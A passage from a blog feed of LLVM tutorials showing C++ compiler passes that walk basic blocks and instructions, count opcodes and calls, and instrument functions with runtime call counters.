</code></pre></div></div> <h3 id="iterating-over-instructions">Iterating over Instructions</h3> <p>You can iterate instructions in a BasicBlocks BB.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="n">Instruction</span> <span class="o">&amp;</span><span class="n">I</span><span class="o">:</span> <span class="n">BB</span><span class="p">){</span>
    <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"Start Inst: "</span> <span class="o">&lt;&lt;</span> <span class="n">I</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/BasicBlock.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Instructions.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="k">namespace</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">YJ00003BB</span> <span class="o">:</span> <span class="k">public</span> <span class="n">FunctionPass</span><span class="p">{</span>
        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>
        <span class="n">YJ00003BB</span><span class="p">()</span> <span class="o">:</span> <span class="n">FunctionPass</span><span class="p">(</span><span class="n">ID</span><span class="p">){}</span>

        <span class="kt">bool</span> <span class="n">runOnFunction</span><span class="p">(</span><span class="n">Function</span> <span class="o">&amp;</span><span class="n">F</span><span class="p">)</span> <span class="k">override</span><span class="p">{</span>
            <span class="c1">// Function</span>
            <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"Start Function: "</span> <span class="o">&lt;&lt;</span> <span class="n">F</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>

            <span class="k">for</span><span class="p">(</span><span class="n">BasicBlock</span> <span class="o">&amp;</span><span class="n">BB</span><span class="o">:</span> <span class="n">F</span><span class="p">){</span>
                <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"Start BB: "</span> <span class="o">&lt;&lt;</span> <span class="n">BB</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="sc">' '</span> <span class="o">&lt;&lt;</span> <span class="n">BB</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>

                <span class="k">for</span><span class="p">(</span><span class="n">Instruction</span> <span class="o">&amp;</span> <span class="n">I</span> <span class="o">:</span> <span class="n">BB</span><span class="p">){</span>
                    <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"Start Inst: "</span> <span class="o">&lt;&lt;</span> <span class="n">I</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">YJ00003BB</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">YJ00003BB</span><span class="o">&gt;</span> <span class="n">X</span><span class="p">(</span><span class="s">"BasicBlock"</span><span class="p">,</span> <span class="s">"Print basic block"</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</code></pre></div></div> <table> <thead> <tr> <th>Pass</th> <th>Type</th> </tr> </thead> <tbody> <tr> <td><a href="../000-Begining_LLVM(KOR)">Writing HelloLLVM Pass</a></td> <td>analysis</td> </tr> <tr> <td><a href="../Iterating_over_Module_Function_BasicBlock">Iterating over Module, Function, Basic block</a></td> <td>analysis</td> </tr> <tr> <td><a href="../002-Count_insts_calls">Count the number of insts, func calls</a></td> <td>analysis</td> </tr> <tr> <td><a href="../003-Insert_func_call">Insert func call</a></td> <td>transformation</td> </tr> <tr> <td><a href="../004-Change_Insts_(obfuscation)">Change Insts (obfuscation)</a></td> <td>transformation</td> </tr> <tr> <td><a href="../005-Traverse_CFG">Control flow graph</a></td> <td>transformation</td> </tr> </tbody> </table> <hr/> <h2 id="reference">Reference</h2> <p>[1] Andrzej Warzyński. llvm-tutor. <a href="https://github.com/banach-space/llvm-tutor">github</a><br/> [2] Adrian Sampson. LLVM for Grad Students. <a href="https://www.cs.cornell.edu/~asampson/blog/llvm.html">blog</a><br/> [3] Keshav Pingali. CS 380C: Advanced Topics in Compilers. <a href="https://www.cs.utexas.edu/~pingali/CS380C/2020/assignments/assignment4/index.html">blog</a></p>]]></content><author><name></name></author><category term="LLVM"/><summary type="html"><![CDATA[LLVM]]></summary></entry><entry><title type="html">002 Count the number of instructions and function calls</title><link href="https://dalnaracrater.github.io/blog/2024/002-Count_insts_calls/" rel="alternate" type="text/html" title="002 Count the number of instructions and function calls"/><published>2024-04-24T05:24:00+00:00</published><updated>2024-04-24T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2024/002-Count_insts_calls</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2024/002-Count_insts_calls/"><![CDATA[ <h2 id="to-be-continued">To be continued…</h2> <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>Learn how to handle instructions</li> <li>learn how to generate instruction (codegen)</li> <li>learn the difference between static analysis and dynamic analysis</li> </ul> <h3 id="isa-dyn_cast">isa&lt;&gt;, dyn_cast&lt;&gt;</h3> <h3 id="static-counting-instructions">(static) Counting instructions</h3> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/BasicBlock.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Instructions.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">&lt;map&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="k">namespace</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">YJ004OpC</span> <span class="o">:</span> <span class="k">public</span> <span class="n">FunctionPass</span> <span class="p">{</span>
        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>
        <span class="n">YJ004OpC</span><span class="p">()</span> <span class="o">:</span> <span class="n">FunctionPass</span><span class="p">(</span><span class="n">ID</span><span class="p">){}</span>

        <span class="kt">bool</span> <span class="nf">runOnFunction</span><span class="p">(</span><span class="n">Function</span><span class="o">&amp;</span> <span class="n">F</span><span class="p">){</span>
            <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="n">opcodeMap</span><span class="p">;</span> <span class="c1">// OpcodeCounter::Result in OpcodeCounter.h</span>
            <span class="c1">// iterate function</span>
            <span class="k">for</span><span class="p">(</span><span class="k">auto</span> <span class="o">&amp;</span><span class="n">BB</span><span class="o">:</span> <span class="n">F</span><span class="p">){</span>
                <span class="k">for</span><span class="p">(</span><span class="n">Instruction</span> <span class="o">&amp;</span> <span class="n">I</span> <span class="o">:</span> <span class="n">BB</span><span class="p">){</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">opcodeMap</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">I</span><span class="p">.</span><span class="n">getOpcodeName</span><span class="p">())</span> <span class="o">!=</span> <span class="n">opcodeMap</span><span class="p">.</span><span class="n">end</span><span class="p">()){</span>
                        <span class="n">opcodeMap</span><span class="p">[</span><span class="n">I</span><span class="p">.</span><span class="n">getOpcodeName</span><span class="p">()]</span> <span class="o">=</span> <span class="n">opcodeMap</span><span class="p">[</span><span class="n">I</span><span class="p">.</span><span class="n">getOpcodeName</span><span class="p">()]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> 
                    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="n">opcodeMap</span><span class="p">[</span><span class="n">I</span><span class="p">.</span><span class="n">getOpcodeName</span><span class="p">()]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"OpCode Info</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(</span><span class="k">auto</span> <span class="n">Opcode</span> <span class="o">:</span> <span class="n">opcodeMap</span><span class="p">){</span>
                <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">Opcode</span><span class="p">.</span><span class="n">first</span> <span class="o">&lt;&lt;</span> <span class="sc">' '</span> <span class="o">&lt;&lt;</span> <span class="n">Opcode</span><span class="p">.</span><span class="n">second</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">YJ004OpC</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">YJ004OpC</span><span class="o">&gt;</span> <span class="n">X</span><span class="p">(</span><span class="s">"OpCount"</span><span class="p">,</span> <span class="s">"Count OpCode"</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</code></pre></div></div> <h3 id="counting-function-calls">counting function calls</h3> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Module.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Instruction.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/IRBuilder.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/CallSite.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="cm">/*
In M, define a global var for count of func call with 0
for each F in M
    increment count by 1, so that the number of call in which function called is recorded

*/</span>

<span class="k">namespace</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">YJ007StaticCallCounter</span> <span class="o">:</span> <span class="k">public</span> <span class="n">ModulePass</span><span class="p">{</span>
        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>

        <span class="n">YJ007StaticCallCounter</span><span class="p">()</span><span class="o">:</span> <span class="n">ModulePass</span><span class="p">(</span><span class="n">ID</span><span class="p">){}</span>

        <span class="kt">bool</span> <span class="nf">runOnModule</span><span class="p">(</span><span class="n">Module</span><span class="o">&amp;</span> <span class="n">M</span><span class="p">)</span> <span class="k">override</span> <span class="p">{</span>
            <span class="n">LLVMContext</span><span class="o">&amp;</span> <span class="n">context</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getContext</span><span class="p">();</span>

            <span class="c1">// llvm map</span>
            <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

            <span class="kt">bool</span> <span class="n">isModified</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">F</span><span class="o">:</span> <span class="n">M</span><span class="p">){</span>
                <span class="c1">// add Inst into the beginning of the func</span>
                <span class="c1">// increment var</span>
                <span class="n">IRBuilder</span><span class="o">&lt;&gt;</span> <span class="n">Builder</span><span class="p">(</span><span class="o">&amp;*</span><span class="n">F</span><span class="p">.</span><span class="n">getEntryBlock</span><span class="p">().</span><span class="n">getFirstInsertionPt</span><span class="p">());</span>

                <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">BB</span><span class="o">:</span> <span class="n">F</span><span class="p">){</span>
                    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">I</span> <span class="o">:</span> <span class="n">BB</span><span class="p">){</span>
                        <span class="c1">//dyn_cast&lt;&gt;, isa&lt;&gt;, cast&lt;&gt;</span>
                        <span class="c1">// if auto inst = I == call</span>
                        <span class="c1">// ++ count into map[F.getName()];</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">isa</span><span class="o">&lt;</span><span class="n">CallInst</span><span class="o">&gt;</span><span class="p">(</span><span class="n">I</span><span class="p">)){</span>
                            <span class="o">++</span><span class="n">count</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">isModified</span><span class="p">){</span>
                <span class="c1">// print map</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">isModified</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">YJ007StaticCallCounter</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">YJ007StaticCallCounter</span><span class="o">&gt;</span> <span class="n">X</span><span class="p">(</span><span class="s">"StaticCallCounter"</span><span class="p">,</span> <span class="s">"Count Static Call"</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</code></pre></div></div> <h3 id="dynamic-counting-instructions">(dynamic) Counting instructions</h3> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Module.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/BasicBlock.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Instruction.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/Transforms/Utils/ModuleUtils.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/IR/IRBuilder.h"</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="k">namespace</span><span class="p">{</span>
    <span class="k">struct</span> <span class="nc">YJ006DynCount</span> <span class="o">:</span> <span class="k">public</span> <span class="n">ModulePass</span><span class="p">{</span>
        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>
        <span class="n">YJ006DynCount</span><span class="p">()</span> <span class="o">:</span> <span class="n">ModulePass</span><span class="p">(</span><span class="n">ID</span><span class="p">){}</span>


        <span class="n">Constant</span> <span class="o">*</span><span class="nf">createGlobalVariable</span><span class="p">(</span><span class="n">Module</span><span class="o">&amp;</span> <span class="n">M</span><span class="p">,</span> <span class="n">StringRef</span> <span class="n">varName</span><span class="p">){</span>

            <span class="k">auto</span><span class="o">&amp;</span> <span class="n">context</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getContext</span><span class="p">();</span>

            <span class="c1">// define global variable</span>
            <span class="n">Constant</span> <span class="o">*</span><span class="n">gVar</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getOrInsertGlobal</span><span class="p">(</span><span class="n">varName</span><span class="p">,</span> <span class="n">Type</span><span class="o">::</span><span class="n">getInt32Ty</span><span class="p">(</span><span class="n">context</span><span class="p">));</span>

            <span class="c1">// get a reference through getNamedGlobal() if it exists.</span>
            <span class="c1">// set some properties: linkage, initial value</span>
            <span class="n">GlobalVariable</span> <span class="o">*</span> <span class="n">gVarRef</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getNamedGlobal</span><span class="p">(</span><span class="n">varName</span><span class="p">);</span>
            <span class="n">gVarRef</span><span class="o">-&gt;</span><span class="n">setLinkage</span><span class="p">(</span><span class="n">GlobalValue</span><span class="o">::</span><span class="n">LinkageTypes</span><span class="o">::</span><span class="n">CommonLinkage</span><span class="p">);</span>
            <span class="n">gVarRef</span><span class="o">-&gt;</span><span class="n">setAlignment</span><span class="p">(</span><span class="n">MaybeAlign</span><span class="p">(</span><span class="mi">4</span><span class="p">));</span>
            <span class="n">gVarRef</span><span class="o">-&gt;</span><span class="n">setInitializer</span><span class="p">(</span><span class="n">ConstantInt</span><span class="o">::</span><span class="n">get</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">APInt</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">0</span><span class="p">)));</span>
 
            <span class="k">return</span> <span class="n">gVar</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kt">bool</span> <span class="nf">runOnModule</span><span class="p">(</span><span class="n">Module</span> <span class="o">&amp;</span><span class="n">M</span><span class="p">)</span> <span class="k">override</span><span class="p">{</span>
            <span class="c1">// global var</span>
            <span class="n">LLVMContext</span> <span class="o">&amp;</span><span class="n">context</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getContext</span><span class="p">();</span>

            <span class="n">StringMap</span><span class="o">&lt;</span><span class="n">Constant</span><span class="o">*&gt;</span> <span class="n">funcCountMap</span><span class="p">;</span>
            <span class="n">StringMap</span><span class="o">&lt;</span><span class="n">Constant</span><span class="o">*&gt;</span> <span class="n">funcNameMap</span><span class="p">;</span>

            <span class="kt">bool</span> <span class="n">modified</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">F</span><span class="o">:</span> <span class="n">M</span><span class="p">){</span>
                <span class="k">if</span><span class="p">(</span><span class="n">F</span><span class="p">.</span><span class="n">isDeclaration</span><span class="p">())</span>
                    <span class="k">continue</span><span class="p">;</span>

                <span class="n">IRBuilder</span><span class="o">&lt;&gt;</span> <span class="n">Builder</span><span class="p">(</span><span class="o">&amp;*</span><span class="n">F</span><span class="p">.</span><span class="n">getEntryBlock</span><span class="p">().</span><span class="n">getFirstInsertionPt</span><span class="p">());</span>

                <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">varName</span> <span class="o">=</span> <span class="s">"Counter_"</span> <span class="o">+</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">(</span><span class="n">F</span><span class="p">.</span><span class="n">getName</span><span class="p">());</span>
                <span class="c1">//define global variable via createGlobalVariable() method</span>
                <span class="n">Constant</span> <span class="o">*</span><span class="n">counter</span> <span class="o">=</span> <span class="n">createGlobalVariable</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="n">varName</span><span class="p">);</span>

                <span class="n">funcCountMap</span><span class="p">[</span><span class="n">F</span><span class="p">.</span><span class="n">getName</span><span class="p">()]</span> <span class="o">=</span> <span class="n">counter</span><span class="p">;</span>

                <span class="n">Constant</span> <span class="o">*</span><span class="n">funcName</span> <span class="o">=</span> <span class="n">Builder</span><span class="p">.</span><span class="n">CreateGlobalStringPtr</span><span class="p">(</span><span class="n">F</span><span class="p">.</span><span class="n">getName</span><span class="p">());</span>
                <span class="n">funcNameMap</span><span class="p">[</span><span class="n">F</span><span class="p">.</span><span class="n">getName</span><span class="p">()]</span> <span class="o">=</span> <span class="n">funcName</span><span class="p">;</span>

                <span class="cm">/*
                load counter
                add counter by 1
                store counter
                */</span>
                <span class="n">LoadInst</span> <span class="o">*</span><span class="n">instLoad</span> <span class="o">=</span> <span class="n">Builder</span><span class="p">.</span><span class="n">CreateLoad</span><span class="p">(</span><span class="n">IntegerType</span><span class="o">::</span><span class="n">getInt32Ty</span><span class="p">(</span><span class="n">context</span><span class="p">),</span> <span class="n">counter</span><span class="p">);</span>
                <span class="n">Value</span><span class="o">*</span> <span class="n">instAdd</span> <span class="o">=</span> <span class="n">Builder</span><span class="p">.</span><span class="n">CreateAdd</span><span class="p">(</span><span class="n">Builder</span><span class="p">.</span><span class="n">getInt32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">instLoad</span><span class="p">);</span>
                <span class="n">Builder</span><span class="p">.</span><span class="n">CreateStore</span><span class="p">(</span><span class="n">instAdd</span><span class="p">,</span> <span class="n">counter</span><span class="p">);</span>

                <span class="n">modified</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">modified</span><span class="p">)</span> <span class="k">return</span> <span class="n">modified</span><span class="p">;</span>

            <span class="c1">// creating a pointer Int8 type</span>
            <span class="n">PointerType</span> <span class="o">*</span><span class="n">PrintfArgTy</span> <span class="o">=</span> <span class="n">PointerType</span><span class="o">::</span><span class="n">getUnqual</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">getInt8Ty</span><span class="p">(</span><span class="n">context</span><span class="p">));</span>

            <span class="c1">// step1: Inject declaration of printf</span>
            <span class="n">FunctionType</span> <span class="o">*</span><span class="n">PrintfTy</span> <span class="o">=</span> <span class="n">FunctionType</span><span class="o">::</span><span class="n">get</span><span class="p">(</span>
                <span class="n">IntegerType</span><span class="o">::</span><span class="n">getInt32Ty</span><span class="p">(</span><span class="n">context</span><span class="p">),</span>
                <span class="n">PrintfArgTy</span><span class="p">,</span>
                <span class="nb">true</span><span class="c1">// variadic</span>
            <span class="p">);</span>

            <span class="n">FunctionCallee</span> <span class="n">Printf</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getOrInsertFunction</span><span class="p">(</span><span class="s">"printf"</span><span class="p">,</span> <span class="n">PrintfTy</span><span class="p">);</span>

            <span class="n">Function</span> <span class="o">*</span><span class="n">PrintfF</span> <span class="o">=</span> <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">Function</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Printf</span><span class="p">.</span><span class="n">getCallee</span><span class="p">());</span>
            <span class="n">PrintfF</span><span class="o">-&gt;</span><span class="n">setDoesNotThrow</span><span class="p">();</span>
            <span class="n">PrintfF</span><span class="o">-&gt;</span><span class="n">addParamAttr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">Attribute</span><span class="o">::</span><span class="n">NoCapture</span><span class="p">);</span>
            <span class="n">PrintfF</span><span class="o">-&gt;</span><span class="n">addParamAttr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">Attribute</span><span class="o">::</span><span class="n">ReadOnly</span><span class="p">);</span>

            <span class="c1">// step2: Inject global variable that will hold the printf format string</span>
            <span class="n">Constant</span> <span class="o">*</span><span class="n">PrintfFormatStr</span> <span class="o">=</span> <span class="n">ConstantDataArray</span><span class="o">::</span><span class="n">getString</span><span class="p">(</span>
                <span class="n">context</span><span class="p">,</span> <span class="s">"Function %s is called %d times</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

            <span class="n">Constant</span> <span class="o">*</span><span class="n">PrintfFormatStrVar</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getOrInsertGlobal</span><span class="p">(</span><span class="s">"PrintfFormatStr"</span><span class="p">,</span> <span class="n">PrintfFormatStr</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">());</span>
            <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">GlobalVariable</span><span class="o">&gt;</span><span class="p">(</span><span class="n">PrintfFormatStrVar</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">setInitializer</span><span class="p">(</span><span class="n">PrintfFormatStr</span><span class="p">);</span>

            <span class="n">FunctionType</span> <span class="o">*</span><span class="n">PrintWrapperTy</span> <span class="o">=</span> <span class="n">FunctionType</span><span class="o">::</span><span class="n">get</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">getVoidTy</span><span class="p">(</span><span class="n">context</span><span class="p">),</span> <span class="p">{},</span> <span class="nb">false</span><span class="p">);</span>
            <span class="n">Function</span> <span class="o">*</span><span class="n">PrintWrapperF</span> <span class="o">=</span> <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">Function</span><span class="o">&gt;</span><span class="p">(</span><span class="n">M</span><span class="p">.</span><span class="n">getOrInsertFunction</span><span class="p">(</span><span class="s">"PrintWrapper"</span><span class="p">,</span> <span class="n">PrintWrapperTy</span><span class="p">).</span><span class="n">getCallee</span><span class="p">());</span>

            <span class="n">BasicBlock</span> <span class="o">*</span><span class="n">retBlock</span> <span class="o">=</span> <span class="n">BasicBlock</span><span class="o">::</span><span class="n">Create</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="s">"enter"</span><span class="p">,</span> <span class="n">PrintWrapperF</span><span class="p">);</span>
            <span class="n">IRBuilder</span><span class="o">&lt;&gt;</span> <span class="n">retBuilder</span><span class="p">(</span><span class="n">retBlock</span><span class="p">);</span>

            <span class="n">Value</span> <span class="o">*</span><span class="n">FormatStrPtr</span> <span class="o">=</span> <span class="n">retBuilder</span><span class="p">.</span><span class="n">CreatePointerCast</span><span class="p">(</span><span class="n">PrintfFormatStrVar</span><span class="p">,</span> <span class="n">PrintfArgTy</span><span class="p">,</span> <span class="s">"formatStr"</span><span class="p">);</span>

            <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">name</span> <span class="o">:</span> <span class="n">funcCountMap</span><span class="p">){</span>
                <span class="k">auto</span> <span class="n">instLoad</span> <span class="o">=</span> <span class="n">retBuilder</span><span class="p">.</span><span class="n">CreateLoad</span><span class="p">(</span><span class="n">IntegerType</span><span class="o">::</span><span class="n">getInt32Ty</span><span class="p">(</span><span class="n">context</span><span class="p">),</span> <span class="n">name</span><span class="p">.</span><span class="n">second</span><span class="p">);</span>

                <span class="n">retBuilder</span><span class="p">.</span><span class="n">CreateCall</span><span class="p">(</span><span class="n">Printf</span><span class="p">,</span> <span class="p">{</span><span class="n">FormatStrPtr</span><span class="p">,</span> <span class="n">funcNameMap</span><span class="p">[</span><span class="n">name</span><span class="p">.</span><span class="n">first</span><span class="p">()],</span> <span class="n">instLoad</span><span class="p">});</span>
            <span class="p">}</span>

            <span class="n">retBuilder</span><span class="p">.</span><span class="n">CreateRetVoid</span><span class="p">();</span>

            <span class="n">appendToGlobalDtors</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="n">PrintWrapperF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

            <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
        <span class="p">}</span>        
    <span class="p">};</span>
<span class="p">}</span>


<span class="kt">char</span> <span class="n">YJ006DynCount</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">YJ006DynCount</span><span class="o">&gt;</span> <span class="n">X</span><span class="p">(</span><span class="s">"DynCount"</span><span class="p">,</span> <span class="s">"Count Dynamic Call"</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</code></pre></div></div> <table> <thead> <tr> <th>Pass</th> <th>Type</th> </tr> </thead> <tbody> <tr> <td><a href="../000-Begining_LLVM(KOR)">Writing HelloLLVM Pass</a></td> <td>analysis</td> </tr> <tr> <td><a href="../Iterating_over_Module_Function_BasicBlock">Iterating over Module, Function, Basic block</a></td> <td>analysis</td> </tr> <tr> <td><a href="../002-Count_insts_calls">Count the number of insts, func calls</a></td> <td>analysis</td> </tr> <tr> <td><a href="../003-Insert_func_call">Insert func call</a></td> <td>transformation</td> </tr> <tr> <td><a href="../004-Change_Insts_(obfuscation)">Change Insts (obfuscation)</a></td> <td>transformation</td> </tr> <tr> <td><a href="../005-Traverse_CFG">Control flow graph</a></td> <td>transformation</td> </tr> </tbody> </table> <h2 id="reference">Reference</h2> <p>[1] Andrzej Warzyński. llvm-tutor. <a href="https://github.com/banach-space/llvm-tutor">github</a><br/> [2] Adrian Sampson. LLVM for Grad Students. <a href="https://www.cs.cornell.edu/~asampson/blog/llvm.html">blog</a><br/> [3] Keshav Pingali. CS 380C: Advanced Topics in Compilers. <a href="https://www.cs.utexas.edu/~pingali/CS380C/2020/assignments/assignment4/index.html">blog</a><br/> [4] Arthur Eubanks. The New Pass Manager. <a href="https://blog.llvm.org/posts/2021-03-26-the-new-pass-manager">blog</a></p>]]></content><author><name></name></author><category term="LLVM"/><summary type="html"><![CDATA[LLVM]]></summary></entry><entry><title type="html">003 Insert function calls</title><link href="https://dalnaracrater.github.io/blog/2024/003-Insert_func_call/" rel="alternate" type="text/html" title="003 Insert function 